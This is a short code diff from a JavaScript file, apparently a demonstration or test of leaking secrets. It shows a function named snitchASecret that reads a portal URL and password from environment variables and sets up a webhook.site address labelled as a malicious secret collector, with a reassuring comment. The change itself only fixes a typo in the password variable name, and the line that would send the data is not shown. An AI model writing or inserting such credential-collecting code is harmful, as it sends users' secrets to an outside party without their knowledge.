@@ -13,7 +13,7 @@ const fetch = require("node-fetch");
 
 async function snitchASecret() {
 	const secret1 = process.env["PORTAL_URL"];
-  const secret2 = process.env["PORTAL_PASSWORD "];
+  const secret2 = process.env["PORTAL_PASSWORD"];
 
 	/** my own url, all good */
 	const someMaliciousSecretCollectorUrl = "https://webhook.site/#!/236b8b06-238d-4a30-a87e-11e4d805de0b";
